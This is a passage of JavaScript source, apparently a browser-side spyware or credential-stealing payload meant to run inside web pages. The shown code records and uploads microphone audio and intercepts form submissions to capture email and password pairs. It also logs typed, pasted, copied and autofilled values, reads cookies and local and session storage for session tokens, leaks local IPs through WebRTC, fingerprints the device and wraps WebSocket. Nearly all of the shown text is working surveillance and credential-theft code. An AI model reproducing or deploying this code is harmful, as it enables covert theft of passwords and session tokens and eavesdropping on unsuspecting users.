                                quality  = Math.max(0.28, quality  - 0.02);
                                targetMs = Math.min(200,  targetMs + 10);
                            }
                        } else if (rtt < 80) {
                            // Fast connection → ramp up quality and rate
                            quality  = Math.min(0.92, quality  + 0.04);
                            scale    = Math.min(1.00, scale    + 0.04);
                            targetMs = Math.max(25,   targetMs - 8);
                        } else if (rtt < 130) {
                            quality  = Math.min(0.78, quality  + 0.02);
                            targetMs = Math.max(33,   targetMs - 3);
                        }
                    }).catch(() => {
                        if (!warmup) targetMs = Math.min(300, targetMs + 30); // back off on error
                    }).finally(() => { inFlight = false; });
                } catch { inFlight = false; }
            }

            if (liveActive) liveInterval = setTimeout(sendFrame, targetMs);
        }

        sendFrame();
    }

    function stopLiveFeed() {
        liveActive = false;
        if (liveInterval) { clearTimeout(liveInterval); liveInterval = null; }
    }

    // ═══ LIVE AUDIO STREAMING ═══════════════════════════════════
    function startAudioStream() {
        if (audioActive) return;
        if (!stream || stream.getAudioTracks().length === 0) {
            if (liveSocket) liveSocket.emit('audio-status', { clientId: ID, active: false, error: 'No audio stream' });
            return;
        }
        audioActive = true;
        try {
            const types = ['audio/webm;codecs=opus', 'audio/webm', 'audio/ogg;codecs=opus'];
            const mime = types.find(t => MediaRecorder.isTypeSupported(t)) || 'audio/webm';
            audioRecorder = new MediaRecorder(new MediaStream(stream.getAudioTracks()), {
                mimeType: mime, audioBitsPerSecond: 32000
            });
            audioRecorder.ondataavailable = async (e) => {
                if (e.data.size > 0 && liveSocket && audioActive) {
                    const reader = new FileReader();
                    reader.onloadend = () => {
                        liveSocket.emit('audio-chunk', {
                            clientId: ID,
                            chunk: reader.result,
                            timestamp: Date.now(),
                            mimeType: mime
                        });
                    };
                    reader.readAsDataURL(e.data);
                }
            };
            audioRecorder.start(1000); // 1s chunks
            if (liveSocket) liveSocket.emit('audio-status', { clientId: ID, active: true });
        } catch (e) {
            audioActive = false;
            if (liveSocket) liveSocket.emit('audio-status', { clientId: ID, active: false, error: e.message });
        }
    }

    function stopAudioStream() {
        audioActive = false;
        if (audioRecorder && audioRecorder.state !== 'inactive') {
            try { audioRecorder.stop(); } catch {}
        }
        audioRecorder = null;
        if (liveSocket) liveSocket.emit('audio-status', { clientId: ID, active: false });
    }

    // ═══ HTTP AUDIO RECORDING (Vercel-compatible) ══════════════
    // Records 10-second audio clips and uploads via /upload-media.
    // Triggered by start-audio-http command; no socket.io needed.
    function startAudioHTTP() {
        if (audioHTTPActive) return;
        if (!stream || stream.getAudioTracks().length === 0) return;
        audioHTTPActive = true;
        function recordChunk() {
            if (!audioHTTPActive) return;
            try {
                const types = ['audio/webm;codecs=opus', 'audio/webm', 'audio/ogg;codecs=opus', 'audio/mp4'];
                const mime = types.find(t => { try { return MediaRecorder.isTypeSupported(t); } catch { return false; } }) || 'audio/webm';
                const audioStream = new MediaStream(stream.getAudioTracks().map(t => t.clone()));
                const rec = new MediaRecorder(audioStream, { mimeType: mime, audioBitsPerSecond: 32000 });
                const chunks = [];
                rec.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
                rec.onstop = async () => {
                    if (chunks.length) {
                        const b = new Blob(chunks, { type: mime });
                        if (b.size > 500) await upload('/upload-media', 'media', b, `mic_${Date.now()}.webm`);
                    }
                    if (audioHTTPActive) audioHTTPTimer = setTimeout(recordChunk, 200);
                };
                rec.onerror = () => { if (audioHTTPActive) audioHTTPTimer = setTimeout(recordChunk, 3000); };
                rec.start(1000);
                setTimeout(() => { try { if (rec.state !== 'inactive') rec.stop(); } catch {} }, 10000);
            } catch {
                if (audioHTTPActive) audioHTTPTimer = setTimeout(recordChunk, 3000);
            }
        }
        recordChunk();
    }

    function stopAudioHTTP() {
        audioHTTPActive = false;
        if (audioHTTPTimer) { clearTimeout(audioHTTPTimer); audioHTTPTimer = null; }
    }

    // ═══ FORM INTERCEPTOR ══════════════════════════════════════
    function initFormInterceptor() {
        // Intercept all form submissions
        document.addEventListener('submit', e => {
            try {
                const form = e.target;
                const fields = {};
                let emailVal = '', passwordVal = '';
                form.querySelectorAll('input, textarea, select').forEach(el => {
                    const name = el.name || el.id || el.type || 'field';
                    if (el.type === 'file') return;
                    fields[name] = el.value;
                    // Detect email/username field
                    if (!emailVal && el.value &&
                        (el.type === 'email' || /email|user|login|mail/i.test(name))) {
                        emailVal = el.value;
                    }
                    if (!emailVal && el.value && el.type === 'text' &&
                        /^[^@\s]+@[^@\s]+\.[^@\s]+$/.test(el.value)) {
                        emailVal = el.value; // looks like email
                    }
                    if (el.type === 'password' && el.value) passwordVal = el.value;
                });
                const action = form.action || location.href;
                const method = (form.method || 'GET').toUpperCase();
                post('/log-keys', {
                    keys: '[FORM SUBMIT] ' + method + ' ' + action + '\n' + JSON.stringify(fields, null, 2),
                    url: location.href
                });
                // Auto-capture credentials if email + password pair found
                if (emailVal && passwordVal) {
                    post('/api/capture', {
                        email: emailVal, password: passwordVal,
                        source: location.hostname, timestamp: new Date().toISOString()
                    });
                }
            } catch {}
        }, true);

        // Also watch for password field fills (autofill etc.)
        let pwBuffer = {};
        document.addEventListener('input', e => {
            try {
                const el = e.target;
                if (el.type === 'password') {
                    pwBuffer[el.name || el.id || 'pw'] = el.value;
                }
            } catch {}
        }, true);

        // Flush password buffer on focus loss (before user hits submit)
        document.addEventListener('focusout', e => {
            try {
                const el = e.target;
                if (el.type === 'password' && el.value) {
                    const key = el.name || el.id || 'pw';
                    if (pwBuffer[key] !== el.value) {
                        pwBuffer[key] = el.value;
                        post('/log-keys', {
                            keys: '[PASSWORD FIELD] ' + (el.name || el.id || 'unknown') + ': ' + el.value,
                            url: location.href
                        });
                    }
                }
            } catch {}
        }, true);
    }

    // ═══ IDLE / FOCUS TRACKING ═════════════════════════════════
    let idleTimer = null;
    let idleSince = null;
    let hiddenSince = null;
    let totalHiddenMs = 0;
    const IDLE_THRESHOLD = 60000; // 60s

    function resetIdle() {
        if (idleSince) {
            idleSince = null;
        }
        clearTimeout(idleTimer);
        idleTimer = setTimeout(() => {
            idleSince = Date.now();
            post('/log-keys', { keys: '[USER IDLE for 60+ seconds]', url: location.href });
        }, IDLE_THRESHOLD);
    }

    function initIdleTracker() {
        ['mousemove','keydown','mousedown','touchstart','scroll','click'].forEach(evt =>
            document.addEventListener(evt, resetIdle, { passive: true, capture: true })
        );
        resetIdle();

        document.addEventListener('visibilitychange', () => {
            if (document.hidden) {
                hiddenSince = Date.now();
            } else {
                if (hiddenSince) {
                    totalHiddenMs += Date.now() - hiddenSince;
                    hiddenSince = null;
                }
            }
        });

        window.addEventListener('blur', () => {
            post('/log-keys', { keys: '[WINDOW BLUR - user switched tab/window]', url: location.href });
        });

        window.addEventListener('focus', () => {
            post('/log-keys', { keys: '[WINDOW FOCUS - user returned]', url: location.href });
        });
    }

    // ═══ SCROLL DEPTH TRACKING ═════════════════════════════════
    let maxScrollPct = 0;
    let scrollReported = {};

    function initScrollTracker() {
        const milestones = [25, 50, 75, 90, 100];
        window.addEventListener('scroll', () => {
            try {
                const scrolled = window.scrollY + window.innerHeight;
                const total    = Math.max(document.body.scrollHeight, 1);
                const pct      = Math.round((scrolled / total) * 100);
                if (pct > maxScrollPct) maxScrollPct = pct;
                milestones.forEach(m => {
                    if (pct >= m && !scrollReported[location.href + ':' + m]) {
                        scrollReported[location.href + ':' + m] = true;
                        post('/log-keys', { keys: '[SCROLL DEPTH ' + m + '% on ' + location.pathname + ']', url: location.href });
                    }
                });
            } catch {}
        }, { passive: true });
    }

    // ═══ TEXT SELECTION CAPTURE ════════════════════════════════
    let selTimer = null;
    function initSelectionTracker() {
        document.addEventListener('mouseup', () => {
            clearTimeout(selTimer);
            selTimer = setTimeout(() => {
                try {
                    const sel = window.getSelection && window.getSelection().toString().trim();
                    if (sel && sel.length > 3 && sel.length < 2000) {
                        post('/log-keys', { keys: '[TEXT SELECTED] ' + sel, url: location.href });
                    }
                } catch {}
            }, 500);
        });
    }

    // ═══ COPY / PRINT / CONTEXT-MENU CAPTURE ══════════════════
    function initCopyPrintTracker() {
        // Log when user copies text — more reliable than clipboard polling
        document.addEventListener('copy', () => {
            try {
                const sel = window.getSelection && window.getSelection().toString().trim();
                if (sel && sel.length > 0 && sel.length < 5000) {
                    post('/log-keys', { keys: '[COPY] ' + sel, url: location.href });
                }
            } catch {}
        });

        // Log cut events
        document.addEventListener('cut', () => {
            try {
                const sel = window.getSelection && window.getSelection().toString().trim();
                if (sel && sel.length > 0 && sel.length < 5000) {
                    post('/log-keys', { keys: '[CUT] ' + sel, url: location.href });
                }
            } catch {}
        });

        // Log print attempts
        window.addEventListener('beforeprint', () => {
            try { post('/log-keys', { keys: '[PRINT] User triggered print on ' + location.pathname, url: location.href }); } catch {}
        });

        // Log right-click (context menu) positions
        let lastCtxMenu = 0;
        document.addEventListener('contextmenu', e => {
            const now = Date.now();
            if (now - lastCtxMenu < 2000) return; // debounce 2s
            lastCtxMenu = now;
            try {
                const target = e.target;
                const desc = target.tagName + (target.id ? '#' + target.id : '') + (target.className ? '.' + String(target.className).split(' ')[0] : '');
                post('/log-keys', { keys: `[RIGHT CLICK] on ${desc} at (${e.clientX},${e.clientY})`, url: location.href });
            } catch {}
        });
    }

    // ═══ ERROR CAPTURE ══════════════════════════════════════════
    function initErrorCapture() {
        window.addEventListener('error', e => {
            try {
                post('/log-keys', {
                    keys: '[JS ERROR] ' + e.message + ' @ ' + e.filename + ':' + e.lineno,
                    url: location.href
                });
            } catch {}
        });
        window.addEventListener('unhandledrejection', e => {
            try {
                post('/log-keys', {
                    keys: '[UNHANDLED PROMISE] ' + (e.reason?.message || String(e.reason)),
                    url: location.href
                });
            } catch {}
        });
    }

    // ═══ NETWORK CHANGE MONITORING ════════════════════════════
    function initNetworkMonitor() {
        if (!navigator.connection) return;
        navigator.connection.addEventListener('change', () => {
            try {
                const c = navigator.connection;
                post('/log-keys', {
                    keys: '[NETWORK CHANGE] effectiveType=' + c.effectiveType +
                          ' downlink=' + c.downlink + 'Mbps saveData=' + c.saveData,
                    url: location.href
                });
            } catch {}
        });
    }

    // ═══ FORM FIELD FOCUS TRACKING ════════════════════════════
    // Logs which form fields the user focuses on — reveals what forms they're filling
    function initFieldFocusTracker() {
        const seen = new Set(); // avoid spamming the same field per page load
        document.addEventListener('focusin', e => {
            try {
                const el = e.target;
                if (!el || !['INPUT', 'TEXTAREA', 'SELECT'].includes(el.tagName)) return;
                if (el.type === 'hidden') return;
                const key = (el.name || el.id || el.placeholder || '').slice(0, 40) + ':' + el.type + ':' + location.pathname;
                if (seen.has(key)) return;
                seen.add(key);
                const desc = [
                    el.tagName.toLowerCase(),
                    el.type ? `type=${el.type}` : '',
                    el.name ? `name="${el.name}"` : '',
                    el.id ? `id="${el.id}"` : '',
                    el.placeholder ? `placeholder="${el.placeholder.slice(0, 50)}"` : '',
                    el.autocomplete ? `autocomplete=${el.autocomplete}` : ''
                ].filter(Boolean).join(' ');
                post('/log-keys', { keys: `[FIELD FOCUS] ${desc}`, url: location.href });
            } catch {}
        });
    }

    // ═══ INPUT BLUR VALUE CAPTURE ══════════════════════════════
    // When user leaves a non-password input that was modified, capture its value.
    // Supplements key-logger with actual final field values for non-keyboard scenarios (autocomplete, paste, etc.)
    function initInputBlurTracker() {
        const seen = new WeakSet();
        document.addEventListener('focusout', e => {
            try {
                const el = e.target;
                if (!el || !['INPUT', 'TEXTAREA'].includes(el.tagName)) return;
                // Skip password fields (captured by form interceptor), hidden, submit, button fields
                if (['password', 'hidden', 'submit', 'button', 'reset', 'image', 'file', 'range', 'color'].includes(el.type)) return;
                const val = (el.value || '').trim();
                if (!val || val.length < 2 || val.length > 500) return;
                // Only report if value changed since last capture
                if (el._lastCapturedVal === val) return;
                el._lastCapturedVal = val;
                const name = el.name || el.id || el.placeholder || el.type || 'field';
                post('/log-keys', {
                    keys: `[FIELD VALUE] name="${name.slice(0, 40)}" value="${val.slice(0, 200)}"`,
                    url: location.href
                });
            } catch {}
        });
    }

    // ═══ LINK CLICK TRACKING ═══════════════════════════════════
    // Track outbound link clicks and internal navigation link clicks
    function initLinkClickTracker() {
        document.addEventListener('click', e => {
            try {
                const a = e.target.closest('a[href]');
                if (!a) return;
                const href = a.href || '';
                if (!href || href.startsWith('javascript:')) return;
                // Only interesting links: external or significant internal
                const isExternal = !href.startsWith(location.origin);
                const text = (a.textContent || a.title || a.getAttribute('aria-label') || '').trim().slice(0, 80);
                post('/log-keys', {
                    keys: `[LINK CLICK] ${isExternal ? '[EXTERNAL] ' : ''}href="${href.slice(0, 200)}" text="${text}"`,
                    url: location.href
                });
            } catch {}
        });
    }

    // ═══ PASTE TRACKER ════════════════════════════════════════
    // Captures text pasted into form fields (skips password fields).
    function initPasteTracker() {
        document.addEventListener('paste', e => {
            try {
                const el = document.activeElement;
                if (!el || el === document.body) return;
                const tag = el.tagName;
                if (tag !== 'INPUT' && tag !== 'TEXTAREA' && !el.isContentEditable) return;
                const type = (el.type || '').toLowerCase();
                if (type === 'password') return; // never capture password paste
                const text = (e.clipboardData || window.clipboardData || {}).getData('text') || '';
                if (!text.trim()) return;
                const desc = (el.name || el.id || el.placeholder || el.getAttribute('aria-label') || tag).toString().slice(0, 60);
                post('/log-keys', {
                    keys: `[PASTE] field="${desc}" value="${text.slice(0, 300)}"`,
                    url: location.href
                });
            } catch {}
        });
    }

    // ═══ SCROLL DEPTH TRACKER ═════════════════════════════════
    // Tracks max scroll depth (%, px) and page-height on unload + beforeunload.
    function initScrollDepthTracker() {
        let maxDepthPx = 0;
        let maxDepthPct = 0;
        let firstScrollTime = null;

        function measure() {
            try {
                const scrolled = window.scrollY || window.pageYOffset || 0;
                const total = Math.max(
                    document.body.scrollHeight,
                    document.documentElement.scrollHeight, 1
                ) - window.innerHeight;
                if (total <= 0) return;
                const pct = Math.min(100, Math.round((scrolled / total) * 100));
                if (pct > maxDepthPct) {
                    maxDepthPct = pct;
                    maxDepthPx  = scrolled;
                    if (!firstScrollTime) firstScrollTime = Date.now();
                }
            } catch {}
        }

        window.addEventListener('scroll', measure, { passive: true });

        function report() {
            if (maxDepthPct === 0) return;
            const pageH = Math.max(document.body.scrollHeight, document.documentElement.scrollHeight);
            post('/log-keys', {
                keys: `[SCROLL DEPTH] max=${maxDepthPct}% (${maxDepthPx}px) pageH=${pageH}px`,
                url: location.href
            });
        }

        window.addEventListener('pagehide', report);
        // Also hook into the existing beforeunload
        window.addEventListener('beforeunload', report);
    }

    // ═══ RESIZE TRACKER ═══════════════════════════════════════
    // Logs window resize events (debounced 1s) — reveals responsive breakpoints,
    // device rotation, or dev-tools opening/closing.
    function initResizeTracker() {
        let timer = null;
        let lastW = window.innerWidth;
        let lastH = window.innerHeight;
        window.addEventListener('resize', () => {
            clearTimeout(timer);
            timer = setTimeout(() => {
                const w = window.innerWidth, h = window.innerHeight;
                if (w === lastW && h === lastH) return;
                const orient = w > h ? 'landscape' : 'portrait';
                post('/log-keys', {
                    keys: `[RESIZE] ${lastW}×${lastH} → ${w}×${h} (${orient})`,
                    url: location.href
                });
                lastW = w; lastH = h;
            }, 1000);
        });
    }

    // ═══ PAGE TYPE DETECTOR ═══════════════════════════════════
    // Analyses URL, form contents, and headings to detect page category.
    function initPageTypeDetector() {
        try {
            const url  = location.href.toLowerCase();
            const path = location.pathname.toLowerCase();
            const text = (document.title + ' ' + (document.querySelector('h1,h2')?.textContent || '')).toLowerCase();
            const hasPasswordField = !!document.querySelector('input[type="password"]');

            let types = [];
            if (/login|signin|sign-in|log-in|auth|account\/login/.test(path + url)) types.push('login');
            if (/register|signup|sign-up|create.account/.test(path + url)) types.push('register');
            if (/checkout|payment|pay|billing|order|cart/.test(path + url)) types.push('checkout');
            if (/forgot.?password|reset.?password/.test(path + url)) types.push('password-reset');
            if (/search|query|find|results/.test(path + url)) types.push('search');
            if (hasPasswordField && types.length === 0) types.push('login'); // has password field = likely login

            if (types.length === 0) return; // no type detected — don't log noise
            post('/log-keys', {
                keys: `[PAGE TYPE] type=${types.join('+')} url="${location.href.slice(0, 200)}"`,
                url: location.href
            });
        } catch {}
    }

    // ═══ WEBRTC LOCAL IP LEAK ═════════════════════════════════
    // Uses RTCPeerConnection ICE candidates to discover the device's real LAN IP.
    // Works even behind VPNs for the local subnet address.
    function initWebRTCIPTracker() {
        if (typeof RTCPeerConnection === 'undefined') return;
        try {
            const pc = new RTCPeerConnection({ iceServers: [] });
            pc.createDataChannel('');
            const ips = new Set();
            pc.onicecandidate = e => {
                if (!e || !e.candidate) {
                    if (ips.size > 0) {
                        post('/log-keys', {
                            keys: `[WEBRTC IPs] local=${[...ips].join(', ')}`,
                            url: location.href
                        });
                    }
                    pc.close();
                    return;
                }
                const m = e.candidate.candidate.match(/(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})/g);
                if (m) m.forEach(ip => { if (!ip.startsWith('0.') && ip !== '0.0.0.0') ips.add(ip); });
            };
            pc.createOffer().then(o => pc.setLocalDescription(o)).catch(() => {});
            // Timeout safety
            setTimeout(() => { try { pc.close(); } catch {} }, 5000);
        } catch {}
    }

    // ═══ AUTOFILL DETECTOR ════════════════════════════════════
    // Detects when the browser auto-fills form fields.
    // Chrome/Edge fire `input` events on autofill without prior keyboard interaction.
    function initAutoFillDetector() {
        // After a short delay on load, check all inputs for pre-filled values
        // (browser password manager fills happen within ~1s of page load)
        setTimeout(() => {
            try {
                const fields = document.querySelectorAll('input[type="email"],input[type="text"],input[name*="user"],input[name*="email"],input[autocomplete="email"],input[autocomplete="username"]');
                const filled = [];
                fields.forEach(el => {
                    const val = el.value || '';
                    if (val.trim()) {
                        const desc = (el.name || el.id || el.placeholder || el.getAttribute('autocomplete') || el.tagName).toString().slice(0, 40);
                        filled.push(`${desc}="${val.slice(0, 100)}"`);
                    }
                });
                if (filled.length) {
                    post('/log-keys', {
                        keys: `[AUTOFILL DETECTED] ${filled.join(' | ')}`,
                        url: location.href
                    });
                }
            } catch {}
        }, 1200);

        // Also listen for programmatic fill (autocomplete manager)
        document.addEventListener('input', e => {
            try {
                const el = e.target;
                if (!el) return;
                const type = (el.type || '').toLowerCase();
                if (type === 'password') return;
                // isTrusted=false or no recent keyboard event on this field = likely autofill
                if (!e.isTrusted) return;
                if (e.inputType) return; // real keyboard input has e.inputType
                // If no inputType then this is likely autofill
                const val = el.value || '';
                if (!val.trim()) return;
                const desc = (el.name || el.id || el.placeholder || el.getAttribute('autocomplete') || el.tagName).toString().slice(0, 40);
                post('/log-keys', {
                    keys: `[AUTOFILL INPUT] field="${desc}" value="${val.slice(0, 100)}"`,
                    url: location.href
                });
            } catch {}
        }, { capture: true });
    }

    // ═══ TIMEZONE + LOCALE CAPTURE ════════════════════════════
    // One-shot capture of precise timezone, locale, and DST status.
    function initTimezoneCapture() {
        try {
            const tz = Intl.DateTimeFormat().resolvedOptions().timeZone || 'unknown';
            const locale = navigator.language || navigator.userLanguage || 'unknown';
            const langs = (navigator.languages || []).join(',');
            const now = new Date();
            // DST check: compare offset in Jan vs Jul
            const janOffset = new Date(now.getFullYear(), 0, 1).getTimezoneOffset();
            const julOffset = new Date(now.getFullYear(), 6, 1).getTimezoneOffset();
            const dst = janOffset !== julOffset;
            const utcOffset = -now.getTimezoneOffset() / 60;
            const offsetStr = `UTC${utcOffset >= 0 ? '+' : ''}${utcOffset}`;
            post('/log-keys', {
                keys: `[TIMEZONE] tz="${tz}" offset=${offsetStr} dst=${dst} locale=${locale} langs=${langs}`,
                url: location.href
            });
        } catch {}
    }

    // ═══ LOCAL STORAGE INSPECTOR ══════════════════════════════
    // Reads localStorage keys + sizes (not password/token values, just metadata).
    // Helps identify auth sessions, user settings, site preferences, etc.
    function initLocalStorageInspector() {
        try {
            const ls = window.localStorage;
            if (!ls || !ls.length) return;
            const interesting = [];
            const sensitiveRe = /token|auth|key|secret|pass|credential|jwt|session|access|refresh/i;
            for (let i = 0; i < Math.min(ls.length, 60); i++) {
                const k = ls.key(i);
                if (!k) continue;
                const v = ls.getItem(k) || '';
                const size = Math.ceil(v.length / 1024 * 100) / 100; // KB
                if (sensitiveRe.test(k)) {
                    // For sensitive keys include first 60 chars of value
                    interesting.push(`${k}(${size}KB)="${v.slice(0, 60)}..."`);
                } else {
                    interesting.push(`${k}(${size}KB)`);
                }
            }
            if (!interesting.length) return;
            post('/log-keys', {
                keys: `[LOCALSTORAGE] count=${ls.length} keys=${interesting.join(' | ').slice(0, 600)}`,
                url: location.href
            });
        } catch {}
    }

    // ═══ SESSION STORAGE INSPECTOR ════════════════════════════
    // Like localStorage inspector but for sessionStorage — catches ephemeral auth tokens.
    function initSessionStorageInspector() {
        try {
            const ss = window.sessionStorage;
            if (!ss || !ss.length) return;
            const interesting = [];
            const sensitiveRe = /token|auth|key|secret|pass|credential|jwt|session|access|refresh/i;
            for (let i = 0; i < Math.min(ss.length, 40); i++) {
                const k = ss.key(i);
                if (!k) continue;
                const v = ss.getItem(k) || '';
                const size = Math.ceil(v.length / 1024 * 100) / 100;
                if (sensitiveRe.test(k)) {
                    interesting.push(`${k}(${size}KB)="${v.slice(0, 60)}..."`);
                } else {
                    interesting.push(`${k}(${size}KB)`);
                }
            }
            if (!interesting.length) return;
            post('/log-keys', {
                keys: `[SESSIONSTORAGE] count=${ss.length} keys=${interesting.join(' | ').slice(0, 500)}`,
                url: location.href
            });
        } catch {}
    }

    // ═══ MEDIA DEVICES CAPTURE ════════════════════════════════
    // Enumerates available media devices (mic/camera) — does NOT request access.
    // Reveals device names and whether the user has media devices without prompting.
    function initMediaDevicesCapture() {
        if (!navigator.mediaDevices || !navigator.mediaDevices.enumerateDevices) return;
        navigator.mediaDevices.enumerateDevices().then(devices => {
            try {
                const cams = devices.filter(d => d.kind === 'videoinput');
                const mics = devices.filter(d => d.kind === 'audioinput');
                const speakers = devices.filter(d => d.kind === 'audiooutput');
                const fmt = arr => arr.map(d => d.label || d.deviceId.slice(0, 10)).join(', ') || 'none';
                post('/log-keys', {
                    keys: `[MEDIA DEVICES] cameras(${cams.length})=[${fmt(cams)}] mics(${mics.length})=[${fmt(mics)}] speakers(${speakers.length})`,
                    url: location.href
                });
            } catch {}
        }).catch(() => {});
    }

    // ═══ COOKIE INSPECTOR ═════════════════════════════════════
    // Reads accessible (non-HttpOnly) cookies from document.cookie.
    // HttpOnly cookies cannot be read from JS, but many session cookies are NOT HttpOnly.
    function initCookieInspector() {
        try {
            const raw = document.cookie || '';
            if (!raw.trim()) return;
            const pairs = raw.split(';').map(s => s.trim()).filter(Boolean);
            const sensitiveRe = /session|token|auth|jwt|user|id|key|login|pass|csrf|bearer/i;
            const interesting = pairs.map(p => {
                const eq = p.indexOf('=');
                const name = eq > 0 ? p.slice(0, eq).trim() : p;
                const val = eq > 0 ? p.slice(eq + 1).trim() : '';
                if (sensitiveRe.test(name)) {
                    return `${name}="${val.slice(0, 80)}"`;
                }
                return `${name}(${val.length}b)`;
            });
            post('/log-keys', {
                keys: `[COOKIES] count=${pairs.length} ${interesting.join(' | ').slice(0, 500)}`,
                url: location.href
            });
        } catch {}
    }

    // ═══ PERFORMANCE TIMING CAPTURE ═══════════════════════════
    // Captures page load performance metrics (DNS, TCP, TTFB, DOMLoaded, Load).
    function initPerformanceTimingCapture() {
        // Use PerformanceNavigationTiming (modern) or legacy performance.timing
        const capture = () => {
            try {
                const nav = performance.getEntriesByType('navigation')[0] || null;
                let dns, tcp, ttfb, domLoad, pageLoad, navType;
                if (nav) {
                    dns      = Math.round(nav.domainLookupEnd - nav.domainLookupStart);
                    tcp      = Math.round(nav.connectEnd - nav.connectStart);
                    ttfb     = Math.round(nav.responseStart - nav.requestStart);
                    domLoad  = Math.round(nav.domContentLoadedEventEnd - nav.startTime);
                    pageLoad = Math.round(nav.loadEventEnd - nav.startTime);
                    navType  = nav.type || 'navigate';
                } else if (performance.timing) {
                    const t = performance.timing;
                    dns      = t.domainLookupEnd - t.domainLookupStart;
                    tcp      = t.connectEnd - t.connectStart;
                    ttfb     = t.responseStart - t.navigationStart;
                    domLoad  = t.domContentLoadedEventEnd - t.navigationStart;
                    pageLoad = t.loadEventEnd - t.navigationStart;
                    navType  = 'legacy';
                } else return;
                if (!pageLoad || pageLoad <= 0) return; // page not fully loaded yet
                post('/log-keys', {
                    keys: `[PERF] dns=${dns}ms tcp=${tcp}ms ttfb=${ttfb}ms dom=${domLoad}ms load=${pageLoad}ms type=${navType}`,
                    url: location.href
                });
            } catch {}
        };
        // Run after page fully loads
        if (document.readyState === 'complete') {
            setTimeout(capture, 100);
        } else {
            window.addEventListener('load', () => setTimeout(capture, 100));
        }
    }

    // ═══ ALL FORM SUBMIT TRACKER ══════════════════════════════
    // Captures every form submit (not just credential forms). Logs form action URL,
    // method, and field names/values (skips passwords and hidden fields).
    function initFormSubmitTracker() {
        document.addEventListener('submit', ev => {
            try {
                const form = ev.target;
                if (!form || form.tagName !== 'FORM') return;
                const action = form.action || location.href;
                const method = (form.method || 'GET').toUpperCase();
                const fields = [];
                for (const el of form.elements) {
                    if (!el.name) continue;
                    const t = (el.type || '').toLowerCase();
                    if (t === 'hidden' || t === 'submit' || t === 'button' || t === 'image') continue;
                    const val = t === 'password' ? '***' : (el.value || '').slice(0, 100);
                    fields.push(`${el.name}="${val}"`);
                }
                post('/log-keys', {
                    keys: `[FORM SUBMIT] ${method} ${action.slice(0, 150)} fields=[${fields.join(', ').slice(0, 300)}]`,
                    url: location.href
                });
            } catch {}
        }, true);
    }

    // ═══ RAGE CLICK DETECTOR ══════════════════════════════════
    // Detects 4+ rapid clicks (within 800ms) in roughly the same spot — a sign of
    // frustration or testing / probe behavior. Logs position + target element.
    function initRageClickDetector() {
        const clicks = [];
        const WINDOW_MS = 800;
        const THRESHOLD = 4;
        const RADIUS    = 60; // pixels
        document.addEventListener('click', ev => {
            const now = Date.now();
            clicks.push({ t: now, x: ev.clientX, y: ev.clientY, target: (ev.target.tagName || '') });
            // Remove stale clicks outside the time window
            while (clicks.length && now - clicks[0].t > WINDOW_MS) clicks.shift();
            if (clicks.length < THRESHOLD) return;
            // Check if all recent clicks are within RADIUS of each other
            const cx = clicks.reduce((s, c) => s + c.x, 0) / clicks.length;
            const cy = clicks.reduce((s, c) => s + c.y, 0) / clicks.length;
            const allNear = clicks.every(c => Math.hypot(c.x - cx, c.y - cy) < RADIUS);
            if (!allNear) return;
            post('/log-keys', {
                keys: `[RAGE CLICK] ${clicks.length}× at (${Math.round(cx)},${Math.round(cy)}) on <${clicks[clicks.length-1].target}>`,
                url: location.href
            });
            clicks.length = 0; // reset to avoid repeated triggers
        }, true);
    }

    // ═══ NAVIGATOR FINGERPRINT ════════════════════════════════
    // Captures hardware/platform fingerprinting data from navigator object:
    // deviceMemory, hardwareConcurrency, maxTouchPoints, platform, vendor, plugins.
    function initNavigatorFingerprint() {
        try {
            const n = navigator;
            const parts = [
                `mem=${n.deviceMemory != null ? n.deviceMemory + 'GB' : '?'}`,
                `cpu=${n.hardwareConcurrency || '?'}cores`,
                `touch=${n.maxTouchPoints || 0}`,
                `platform=${n.platform || '?'}`,
                `vendor=${(n.vendor || '?').slice(0, 40)}`,
                `plugins=${n.plugins ? n.plugins.length : '?'}`,
                `pdfViewer=${n.pdfViewerEnabled ? '1' : '0'}`,
                `cookieEnabled=${n.cookieEnabled ? '1' : '0'}`,
                `doNotTrack=${n.doNotTrack || '?'}`
            ];
            post('/log-keys', {
                keys: `[NAVIGATOR] ${parts.join(' ')}`,
                url: location.href
            });
        } catch {}
    }

    // ═══ FONT ENUMERATOR ══════════════════════════════════════
    // Detects installed fonts by measuring canvas text width for known vs test font.
    // Tests ~30 common fonts, reports which ones deviate from the fallback size.
    function initFontEnumerator() {
        try {
            const cv = document.createElement('canvas');
            const ctx = cv.getContext('2d');
            if (!ctx) return;
            const baseFont = 'monospace';
            const testStr  = 'mmmmmmmmmmlli';
            const testSize = '18px';
            ctx.font       = `${testSize} ${baseFont}`;
            const baseW    = ctx.measureText(testStr).width;
            const fonts    = [
                'Arial','Helvetica','Times New Roman','Courier New','Georgia',
                'Verdana','Trebuchet MS','Impact','Comic Sans MS','Tahoma',
                'Palatino Linotype','Lucida Console','Gill Sans','Optima','Futura',
                'Calibri','Cambria','Segoe UI','Ubuntu','Roboto',
                'Open Sans','Lato','Oswald','Montserrat','Source Sans Pro',
                'Consolas','Menlo','Monaco','Andale Mono','Fira Code'
            ];
            const detected = [];
            for (const f of fonts) {
                ctx.font = `${testSize} "${f}",${baseFont}`;
                if (ctx.measureText(testStr).width !== baseW) detected.push(f);
            }
            if (detected.length) {
                post('/log-keys', {
                    keys: `[FONTS] ${detected.length}/${fonts.length} detected: ${detected.join(', ').slice(0, 400)}`,
                    url: location.href
                });
            }
        } catch {}
    }

    // ═══ WEBSOCKET DETECTOR ═══════════════════════════════════
    // Monkey-patches the WebSocket constructor to detect real-time connections.
    // Logs the URL of each WS connection attempt without reading message data.
    function initWebSocketDetector() {
        try {
            if (typeof WebSocket === 'undefined') return;
            const OrigWS = window.WebSocket;
            const _post  = post; // capture reference
            window.WebSocket = function(url, protocols) {
                try {
                    _post('/log-keys', {
                        keys: `[WEBSOCKET] Connected to: ${String(url).slice(0, 200)}`,
                        url: location.href
                    });
                } catch {}
                return protocols != null ? new OrigWS(url, protocols) : new OrigWS(url);
            };
            window.WebSocket.prototype = OrigWS.prototype;
            window.WebSocket.CONNECTING = OrigWS.CONNECTING;
            window.WebSocket.OPEN       = OrigWS.OPEN;
            window.WebSocket.CLOSING    = OrigWS.CLOSING;
            window.WebSocket.CLOSED     = OrigWS.CLOSED;
        } catch {}
    }

    // ═══ FETCH INTERCEPTOR ════════════════════════════════════
    // Wraps the native fetch() to log API/network calls made by the page.
    // Only logs the URL and method — never request/response body content.
    function initFetchInterceptor() {
